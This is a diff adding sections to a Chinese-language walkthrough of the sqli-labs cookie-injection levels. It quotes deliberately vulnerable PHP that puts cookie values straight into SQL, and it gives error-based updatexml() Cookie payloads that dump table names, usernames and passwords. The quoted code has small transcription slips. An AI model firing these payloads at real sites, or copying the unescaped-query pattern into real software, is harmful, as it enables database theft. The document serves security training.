@@ -511,3 +511,80 @@ $sql="SELECT  users.username, users.password FROM users WHERE users.username=$un
 
 看题目应该是cookie字段注入了。
 
+```php
+if(!isset($_COOKIE['uname'])) {
+	$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
+	$result1 = mysql_query($sql);
+	$row1 = mysql_fetch_array($result1);
+	$cookee = $row1['username'];
+  if($row1)
+			{
+    		// 将查询到的信息，写入到的cookie中。
+				setcookie('uname', $cookee, time()+3600);	
+     	}	
+ else {
+   	if(!isset($_POST['submit']))
+		{
+      // 下次网页刷新，直接取出cookie的uname字段去查找，并且存在报错输出语句。
+			$cookee = $_COOKIE['uname'];
+      $sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
+			$result=mysql_query($sql);
+			if (!$result)
+  				{
+  				die('Issue with your mysql: ' . mysql_error());
+  				}
+			$row = mysql_fetch_array($result);
+      if($row) {} else {}
+    }
+ } 
+
+	
+```
+
+因此，只需要在http请求头中，对cookie字段进行uname参数的进行报错注入即可。
+
+```sql
+// 都是不需要闭合的'' ，
+// 爆破库名
+Cookie: 'uname=' and updatexml(1,concat(0x7e,database(),0x7e),1)#
+// 爆破表名
+Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(table_name) from information_schema.tables where table_schema=database()),1,30 ),0x7e),1)#
+// 爆破表列名
+Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(column_name) from information_schema.columns where table_name='users'),1,30 ),0x7e),1)#
+// 爆破users表数据
+Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(username) from security.users),1,30 ),0x7e),1)#
+Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(password) from security.users),1,30 ),0x7e),1)#
+```
+
+
+
+##### 21. Cookie injections - Uagent field - error based
+
+```php
+if(!isset($_COOKIE['uname'])){
+  		$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
+			$result1 = mysql_query($sql);
+			$row1 = mysql_fetch_array($result1);
+			if($row1) {
+        setcookie('uname', base64_encode($row1['username']), time()+3600);	
+      } else {}
+} esle {
+  	if(!isset($_POST['submit']))
+		{
+      $cookee = base64_decode($cookee);
+			$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
+			$result=mysql_query($sql);
+			if (!$result)
+  				{
+  				die('Issue with your mysql: ' . mysql_error());
+  				}
+			$row = mysql_fetch_array($result);
+			if($row) {} else {}
+    }
+}
+```
+
+看源码，会对查询到的数据库信息进行`base64_encode`，然后再插入cookie字段中。而取出来的cookie，也是需要先经过`base_decode`，因此注入到cookie的代码，需要先进过`base64_encode`。
+
+噢！还要**注意闭合**！！
+
